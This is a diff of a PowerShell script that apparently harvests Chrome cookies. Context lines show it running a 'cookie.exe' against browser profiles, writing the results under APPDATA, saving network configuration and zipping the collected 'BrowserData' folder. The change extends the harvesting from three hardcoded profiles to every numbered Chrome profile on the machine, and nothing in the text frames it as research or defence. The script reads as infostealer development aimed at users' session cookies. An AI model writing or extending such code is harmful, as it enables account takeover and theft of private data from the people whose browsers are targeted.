@@ -310,12 +310,8 @@ Write-Host "Network configuration saved."
 # Function to run cookie.exe, open Chrome with different profiles, and close Chrome after
 function RunCookieExe {
     $cookieExePath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie.exe"
+    $chromeUserDataPath = Join-Path -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
     
-    # Output paths for different profiles
-    $defaultOutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_default.txt"
-    $profile1OutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_profile1.txt"
-    $profile2OutputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_profile2.txt"
-
     # Function to start Chrome with a specified profile and run cookie.exe
     function StartChromeAndRunCookie {
         param (
@@ -342,18 +338,19 @@ function RunCookieExe {
         Write-Host "Chrome closed."
     }
 
-    # Run for default profile
-    StartChromeAndRunCookie -profileDir "Default" -outputPath $defaultOutputPath
-
-    # Run for Profile 1
-    StartChromeAndRunCookie -profileDir "Profile 1" -outputPath $profile1OutputPath
-
-    # Run for Profile 2
-    StartChromeAndRunCookie -profileDir "Profile 2" -outputPath $profile2OutputPath
+    # Loop through all Profile {number} directories
+    Get-ChildItem -Path $chromeUserDataPath -Directory | Where-Object { $_.Name -match '^Profile \d+$' } | ForEach-Object {
+        $profileDir = $_.Name
+        $outputPath = Join-Path -Path "$env:APPDATA\BrowserData\Chrome" -ChildPath "cookie_output_$profileDir.txt"
+        
+        # Run StartChromeAndRunCookie for each profile
+        StartChromeAndRunCookie -profileDir $profileDir -outputPath $outputPath
+    }
 }
 
 # Call the function after other operations
 RunCookieExe
+
 
 # Zip the BrowserData folder
 $zipDir = "$env:APPDATA\ZippedBrowserData"
